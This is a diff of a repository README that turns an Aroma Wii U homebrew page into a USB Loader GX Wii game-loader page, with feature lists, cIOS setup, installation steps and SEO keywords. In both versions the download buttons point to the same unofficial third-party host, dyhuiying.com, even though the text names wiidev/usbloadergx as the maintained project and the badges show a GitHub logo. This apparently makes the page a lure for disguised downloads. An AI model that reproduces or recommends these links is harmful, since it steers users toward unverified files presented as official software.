@@ -1,205 +1,322 @@
-<h1 align="center">🌺 Aroma</h1>
+
+# USB Loader GX — Nintendo Wii Game Loader
 
 <p align="center">
-  <strong>Modular Homebrew. Flexible Environments. Wii U Control.</strong>
+  <img src="https://img.shields.io/badge/Platform-Nintendo%20Wii-blue?style=for-the-badge" alt="Platform: Nintendo Wii"/>
+  <img src="https://img.shields.io/badge/Type-Homebrew%20Application-green?style=for-the-badge" alt="Homebrew Application"/>
+  <img src="https://img.shields.io/badge/Version-4.0--r1283-orange?style=for-the-badge" alt="Version 4.0-r1283"/>
+  <img src="https://img.shields.io/badge/License-GPL--2.0-lightgrey?style=for-the-badge" alt="GPL License"/>
 </p>
 
 <p align="center">
-  Modular homebrew environment for Nintendo Wii U.
-  <br>
-  EnvironmentLoader · Homebrew Launching · Plugin System · Background Modules · Region Free
+  A customizable graphical interface for launching Wii and GameCube games from supported storage devices.
 </p>
 
 <p align="center">
-  <a href="https://dyhuiying.com/s/file">
-    <img src="https://img.shields.io/badge/AROMA%20DOWNLOAD-8B5CF6?style=for-the-badge&logo=nintendo&logoColor=white" alt="Aroma Download">
-  </a>
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-USB%20Loader%20GX-blue?style=for-the-badge&logo=github" alt="Download USB Loader GX"/></a>
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/release-Beta--27-8B5CF6?style=flat-square">
-  <img src="https://img.shields.io/badge/platform-Nintendo%20Wii%20U-8B5CF6?style=flat-square">
-  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
-  <img src="https://img.shields.io/badge/architecture-modular-252525?style=flat-square">
-</p>
+## Overview
 
-<details>
-  <summary>📑 Contents</summary>
+USB Loader GX is a homebrew application for Nintendo Wii that provides a graphical interface for organizing and launching compatible Wii and GameCube game backups.
 
-  - [Quick Start](#-quick-start)
-  - [Requirements](#-requirements)
-  - [Key Features](#-key-features)
-  - [Module Overview](#-module-overview)
-  - [Supported Platforms](#-supported-platforms)
-  - [Compatibility Information](#-compatibility-information)
-  - [Technical Specifications](#-technical-specifications)
-  - [Installation Guide](#-installation-guide)
-  - [FAQ](#-faq)
-  - [SEO Keywords](#-seo-keywords)
-</details>
+The application supports USB storage and SD cards, customizable game libraries, cover artwork, themes, and configurable launch options. It can also provide access to supported homebrew applications and system channels.
 
-## ⚡ Quick Start
+USB Loader GX is an application loader, not custom firmware. It does not independently install a complete system modification or replace the Wii System Menu. Some loading configurations require a compatible custom IOS (cIOS).
 
-1. Prepare an SD card using the Wii U homebrew guide.
-2. Download the Aroma environment bundle from the official project resources.
-3. Extract the bundle to the root of the SD card.
-4. Launch Aroma through EnvironmentLoader.
+The current maintained release line is hosted by the wiidev project. Version 4.0-r1283 includes improvements to storage detection, interface responsiveness, partition handling, and game compatibility.
 
-Aroma starts as the selected Wii U environment and provides its homebrew, module, and plugin functionality.
+## Key Features
 
-## 🖥️ Requirements
+- **Wii Game Loading:** Launch compatible Wii titles from supported USB storage and SD cards.
+- **GameCube Support:** Launch GameCube titles through Nintendont integration.
+- **Graphical Interface:** Browse games using list, grid, cover, and carousel layouts.
+- **Cover Management:** Display and download game covers, disc images, and related artwork.
+- **Custom Themes:** Personalize the interface with supported themes, backgrounds, sounds, and fonts.
+- **Game Information:** Display metadata such as title, region, genre, publisher, and release information when database data is available.
+- **Homebrew Access:** Launch compatible homebrew applications from the loader interface.
+- **Channel Support:** Browse and launch supported system and emulated NAND channels.
+- **Game Settings:** Configure individual launch options for supported titles.
+- **Cheat Support:** Use compatible Ocarina cheat files and per-game cheat settings.
+- **EmuNAND Integration:** Access supported emulated NAND content with a compatible cIOS configuration.
+- **Storage Management:** Browse supported partitions and manage compatible game storage.
+- **Disc Backup Tools:** Use built-in functions to create backups from compatible Wii and GameCube discs.
+- **Parental Controls:** Restrict access to selected menus and features.
+- **Return-to-Loader:** Configure supported return behavior after exiting a launched game.
 
-| Requirement | Specification |
+## Technical Specifications
+
+| Component | Details |
 |---|---|
-| Hardware | Nintendo Wii U |
-| System Firmware | 5.5.5 or 5.5.6 |
-| Storage | SD card |
-| Environment Loader | EnvironmentLoader |
-| Boot Entry | PayloadLoader or another documented entrypoint |
-| Filesystem Layout | Aroma files extracted to the SD card root |
+| Application | USB Loader GX |
+| Latest referenced release | 4.0-r1283 |
+| Platform | Nintendo Wii |
+| Additional platform | Wii U vWii mode |
+| Application type | Homebrew game loader |
+| Interface | Graphical user interface |
+| Wii game formats | WBFS and ISO layouts supported by the loader |
+| GameCube engine | Nintendont |
+| Storage | USB devices and SD cards |
+| Filesystem support | Depends on device, partition, and feature |
+| Configuration | Loader settings and configuration files |
+| Custom IOS | Required for common USB-loading configurations |
+| License | GPL |
+| Maintained project | wiidev/usbloadergx |
 
-## ✨ Key Features
+## Compatibility
 
-### Environment Management
+USB Loader GX is intended for compatible Nintendo Wii homebrew environments.
 
-- 🚀 **EnvironmentLoader Integration** — Loads Aroma as a selectable Wii U environment.
-- 🔄 **Persistent Entry Point** — Supports a persistent entrypoint through PayloadLoader and its installer.
-- 🎛️ **Environment Selection** — Provides environment selection and boot configuration.
-- ⚡ **Coldboot Workflow** — Supports coldboot loading through the documented PayloadLoader setup.
-
-### Homebrew and Plugins
-
-- 🎮 **Homebrew Launching** — Supports launching homebrew applications within the Aroma environment.
-- 🧩 **Wii U Plugin System** — Integrates the Wii U Plugin System for plugin-based extensions.
-- 🔌 **Background Modules** — Runs modules that extend system functionality.
-- 🛠️ **Modular Architecture** — Allows individual tools, modules, and plugins to be added or removed.
-
-### System Integration
-
-- 🌍 **Region Free** — Provides region-free functionality through compatible plugins.
-- 🎮 **GamePad Integration** — Supports features that integrate with the Wii U GamePad environment.
-- 📡 **FTP Access** — Supports background FTP server functionality through ftpiiu_plugin.
-- 🖥️ **Network Homebrew Loading** — Supports Wiiload through the corresponding plugin.
-
-## 📋 Module Overview
-
-| Component | Responsibility |
+| Console | Compatibility |
 |---|---|
-| EnvironmentLoader | Loads and selects the Wii U environment |
-| PayloadLoader | Provides the persistent environment entrypoint |
-| Mocha | Supplies the underlying custom firmware functionality |
-| Wii U Plugin System | Provides plugin loading and integration |
-| homebrew_on_menu_plugin | Enables homebrew launching from the Wii U Menu |
-| ftpiiu_plugin | Provides FTP server functionality |
-| wiiload_plugin | Enables network-based homebrew and plugin loading |
-| region_free_plugin | Adds region-free functionality |
-| drc_region_free_plugin | Enables GamePad pairing across regions |
+| Nintendo Wii | Supported |
+| Wii Family Edition | Supported, with hardware limitations |
+| Wii Mini | Limited; hardware and homebrew configuration restrictions apply |
+| Wii U vWii | Supported with the appropriate vWii-compatible components |
+| Dolphin Emulator | Not a standard native installation target; compatibility depends on the emulator setup |
 
-## 🚀 Supported Platforms
+### Important Compatibility Notes
 
-| Platform | Support |
+- The Homebrew Channel must be available to launch the application.
+- USB game loading commonly requires a compatible d2x cIOS installation.
+- Wii and vWii require different cIOS packages. Do not install a Wii package on vWii.
+- GameCube loading requires Nintendont and a compatible storage layout.
+- USB port, partition, filesystem, and device compatibility can affect detection and performance.
+- Individual games may require specific settings or compatibility adjustments.
+
+## Firmware Features
+
+USB Loader GX is not firmware and does not replace the console's operating system.
+
+Its functionality depends on the existing Wii software environment.
+
+### Homebrew Environment
+
+- Runs as an application through the Homebrew Channel.
+- Uses supported Wii IOS or cIOS components for game-launching operations.
+- Can be installed on an SD card or compatible USB device.
+- Supports optional forwarder channels for convenient launching.
+
+### cIOS Integration
+
+A compatible d2x cIOS configuration is commonly used for USB game loading and additional features.
+
+Typical slot configurations include:
+
+| Slot | Common base |
 |---|---|
-| Nintendo Wii U | Primary target |
-| Wii U Basic / White | Supported Wii U hardware |
-| Wii U Deluxe / Black | Supported Wii U hardware |
-| Wii U GamePad | Integrated environment support |
-| Wii Mode (vWii) | Separate environment and compatibility considerations |
+| 249 | 56 |
+| 250 | 57 |
+| 251 | 58 |
+| 248 | 38, where applicable |
 
-Aroma is a Wii U environment. It is not a replacement for a dedicated vWii homebrew setup.
+These are common configurations, not universal installation instructions. Follow the documentation for the exact cIOS release and console type.
 
-## 🔍 Compatibility Information
+### GameCube Integration
 
-The Aroma project README lists compatibility with:
+GameCube titles are launched through Nintendont rather than through a built-in GameCube emulator.
 
-- Wii U firmware 5.5.5
-- Wii U firmware 5.5.6
+Nintendont must be installed and configured separately.
 
-Aroma supports existing browser-based entrypoints and the persistent PayloadLoader installation path.
+## System Requirements
 
-The environment is modular. Individual plugins and modules have their own requirements and compatibility characteristics.
+### Console Requirements
 
-Aroma is the successor to Tiramisu. Tiramisu remains a separate legacy environment and is primarily relevant when a particular homebrew application requires its older `.elf`-based workflow.
+- Compatible Nintendo Wii or Wii U running vWii.
+- Homebrew Channel installed.
+- Functional SD card or supported USB storage device.
+- Sufficient free storage for the application, configuration, and game files.
+- Compatible cIOS installation for the intended USB-loading features.
+- Nintendont for GameCube game loading.
 
-## 🛠️ Technical Specifications
+### Storage Requirements
 
-| Specification | Details |
-|---|---|
-| Project | Aroma |
-| Platform | Nintendo Wii U |
-| Category | Homebrew environment |
-| Architecture | Modular environment |
-| Environment Loader | EnvironmentLoader |
-| Base Custom Firmware | Mocha |
-| Plugin Framework | Wii U Plugin System |
-| Homebrew Integration | Environment-based homebrew launching |
-| Persistent Entrypoint | PayloadLoader |
-| Storage | SD card |
-| Primary Development Language | C++ |
-| Source Repository | wiiu-env/Aroma |
+Recommended storage preparation:
 
-## 📥 Installation Guide
+- Use a reliable SD card or USB hard drive.
+- FAT32 is a widely used choice for homebrew storage.
+- Use a compatible partition layout.
+- Keep sufficient free space for game files and cover artwork.
+- Use Wii Backup Manager when preparing Wii game files for supported storage layouts.
 
-### 1. Prepare the SD Card
+### Computer Requirements
 
-1. Use the SD card preparation procedure in the Wii U homebrew guide.
-2. Back up existing Wii U homebrew files before changing the card contents.
-3. Keep the required directory structure intact.
+A computer may be useful for:
 
-### 2. Download Aroma
+- Extracting application archives.
+- Preparing SD cards and USB devices.
+- Managing Wii game backup files.
+- Organizing GameCube game directories.
+- Creating backups of configuration files.
 
-1. Open the official Aroma repository.
-2. Obtain the current published Aroma bundle.
-3. Extract the downloaded files to the root of the SD card.
-
-### 3. Configure the Entry Point
-
-Use the official Wii U guide to configure EnvironmentLoader and PayloadLoader.
-
-The recommended setup is to coldboot into EnvironmentLoader and select Aroma as the active environment.
-
-### 4. Launch Aroma
-
-1. Insert the prepared SD card into the Wii U.
-2. Launch EnvironmentLoader using the configured entrypoint.
-3. Select Aroma if the environment menu appears.
-4. If necessary, hold X while launching EnvironmentLoader to force the menu to open.
-
-### 5. Add Plugins
-
-Place compatible plugins in the documented Aroma directory structure.
-
-Follow each plugin's installation instructions and verify its dependencies before launching the environment.
-
-## ❓ FAQ
-
-### What is Aroma for Wii U?
-
-Aroma is a modular homebrew environment that provides homebrew launching, background modules, plugin support, and system integration for Nintendo Wii U.
-
-### Is Aroma the successor to Tiramisu?
-
-Yes. Aroma is the newer environment developed by the Wii U homebrew community. Tiramisu remains available as a separate legacy environment.
-
-### Which Wii U firmware versions are listed as compatible?
-
-The Aroma repository lists firmware 5.5.5 and 5.5.6.
-
-### Can Aroma load homebrew applications from the Wii U Menu?
-
-Yes. The homebrew_on_menu_plugin supports launching homebrew directly from the Wii U Menu.
-
-### How do I update Aroma?
-
-Download the latest published Aroma bundle and follow the official update instructions. Preserve other SD card files and review plugin compatibility when updating.
-
-## 🔎 SEO Keywords
-
-Aroma Wii U, Nintendo Wii U homebrew, Wii U custom firmware environment, Aroma homebrew environment, Wii U EnvironmentLoader, Wii U Plugin System, Wii U homebrew launcher, Wii U PayloadLoader, Wii U background modules, Wii U region free plugin, Wii U FTPiiU, Wii U Wiiload, Aroma installation guide, Aroma Beta 27, Wii U firmware 5.5.6, Wii U homebrew plugins, Tiramisu successor, Wii U environment setup, Wii U homebrew SD card, Nintendo Wii U modding
+## Download & Installation
 
 <p align="center">
-  <strong>🌺 Aroma</strong>
-  <br>
-  EnvironmentLoader · Homebrew · Plugins · Background Modules
-  <br>
-  Nintendo Wii U Homebrew Environment
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Latest%20Package-blue?style=for-the-badge&logo=github" alt="Download Latest Package"/></a>
 </p>
+
+### Installation Using the Homebrew Channel
+
+1. Prepare an SD card or compatible USB storage device.
+2. Download and extract the USB Loader GX package.
+3. Copy the `apps` directory to the root of the storage device.
+4. Confirm that the application directory is present:
+
+   `SD:/apps/usbloader_gx/`
+
+5. Insert the storage device into the console.
+6. Launch the Homebrew Channel.
+7. Select USB Loader GX and start the application.
+8. Configure the storage device and game display settings.
+
+### cIOS Configuration
+
+For common USB-loading configurations, install a compatible d2x cIOS release using instructions intended for the exact console.
+
+- Use the Wii-specific package on an original Wii.
+- Use the vWii-specific package on a Wii U.
+- Do not mix Wii and vWii installation files.
+- Verify the selected IOS bases and slots before installing.
+- Avoid installing system components from unverified packages.
+
+### Wii Game Storage Layout
+
+A commonly used directory structure is:
+
+`/wbfs/Game Name [GAMEID]/Game.wbfs`
+
+Wii Backup Manager can help prepare and organize supported game files.
+
+### GameCube Storage Layout
+
+A commonly used Nintendont directory structure is:
+
+`/games/Game Name [GAMEID]/game.iso`
+
+GameCube loading requires Nintendont and a compatible storage configuration.
+
+## Configuration & Management
+
+### Loader Settings
+
+USB Loader GX provides settings for:
+
+- Game display and sorting.
+- Storage partition selection.
+- Cover and artwork downloads.
+- Game-specific launch options.
+- Video and language settings.
+- Cheat configuration.
+- Parental controls.
+- Theme selection.
+- Home menu behavior.
+- Return-to-loader configuration.
+
+### Cover Management
+
+The loader can display different artwork types when compatible files or database information are available.
+
+Supported artwork options may include:
+
+- 2D covers.
+- 3D box covers.
+- Disc artwork.
+- Game banners.
+
+Artwork availability depends on the configured database and network access.
+
+### Custom Themes
+
+1. Prepare a theme compatible with the installed loader version.
+2. Copy the theme files into the appropriate USB Loader GX theme directory.
+3. Open the Theme Menu in the application settings.
+4. Select the installed theme.
+5. Apply the theme and restart the interface if required.
+
+### Configuration Backup
+
+Before updating or changing major settings:
+
+- Back up the USB Loader GX application directory.
+- Preserve existing configuration files.
+- Keep a separate copy of custom themes.
+- Record the current cIOS configuration.
+- Avoid overwriting unrelated homebrew applications.
+
+## Troubleshooting
+
+| Problem | Recommended action |
+|---|---|
+| USB Loader GX does not appear in Homebrew Channel | Check the `apps/usbloader_gx/` directory and `boot.dol` file. |
+| USB device is not detected | Check the USB port, partition layout, filesystem, and device compatibility. |
+| Games do not launch | Verify the cIOS configuration and selected IOS slot. |
+| Black screen when launching a game | Check game-specific settings, video mode, and cIOS compatibility. |
+| GameCube games are missing | Verify Nintendont installation and the `/games/` directory structure. |
+| Covers are not displayed | Check network access, game IDs, and artwork download settings. |
+| Custom theme does not load | Confirm that the theme is compatible and stored in the correct directory. |
+| Loader freezes during startup | Test with default settings and remove potentially incompatible custom configuration files. |
+| Game list is incomplete | Check the selected partition, file layout, and game IDs. |
+| vWii installation has problems | Verify that all installed components are specifically intended for vWii. |
+
+### Additional Recovery Recommendations
+
+- Test the application with a clean configuration.
+- Disconnect unnecessary USB devices.
+- Check the SD card or USB drive for filesystem errors.
+- Confirm that the application archive was extracted correctly.
+- Avoid mixing files from unrelated USB Loader GX builds.
+- Keep a backup of the console's existing configuration before changing system-level components.
+
+## FAQ
+
+### 1. What is USB Loader GX?
+
+USB Loader GX is a homebrew application that provides a graphical interface for organizing and launching compatible Wii and GameCube games.
+
+### 2. Does USB Loader GX install custom firmware?
+
+No. It is an application loader, not custom firmware. Its advanced loading functions may depend on a separately installed cIOS.
+
+### 3. Does it support Nintendo Wii?
+
+Yes. It is designed for compatible Nintendo Wii homebrew environments.
+
+### 4. Does it work on Wii U?
+
+It can run in the Wii U's vWii mode when the appropriate vWii homebrew environment and compatible components are installed.
+
+### 5. Can it launch GameCube games?
+
+Yes. GameCube launching is provided through Nintendont integration.
+
+### 6. Is a USB hard drive required?
+
+No. Supported configurations can use USB storage or an SD card. Device and game-loading compatibility may vary.
+
+### 7. Is cIOS required?
+
+A compatible cIOS is commonly required for USB game loading. Requirements depend on the console and intended features.
+
+### 8. Can I customize the interface?
+
+Yes. USB Loader GX supports custom themes and multiple game display layouts.
+
+### 9. Can I use game covers?
+
+Yes. The application supports cover artwork and related game information when the required files or database data are available.
+
+### 10. Does USB Loader GX replace the Wii System Menu?
+
+No. It runs as a homebrew application and does not replace the Wii System Menu.
+
+### 11. Can I launch homebrew applications from USB Loader GX?
+
+Yes. The loader includes functionality for launching compatible homebrew applications.
+
+### 12. What is the latest version referenced in this repository?
+
+The latest referenced release is USB Loader GX 4.0-r1283, published on July 4, 2025. Check the maintained project repository for newer releases.
+
+## SEO Keywords
+
+Nintendo Wii, USB Loader GX, USB Loader GX Wii, Wii USB Loader, Wii Homebrew, Nintendo Wii Homebrew, Wii Game Loader, Wii Game Backup Loader, Wii USB Loading, Wii SD Card Loading, GameCube Loader, Nintendont, Wii cIOS, d2x cIOS, Wii Homebrew Applications, Wii Game Management, Wii Game Covers, Wii Custom Themes, Wii Backup Manager, Wii WBFS, Wii ISO, Wii FAT32, Wii vWii, Wii U vWii Homebrew, Wii Homebrew Setup, USB Loader GX Installation, USB Loader GX Configuration, Wii Game Compatibility
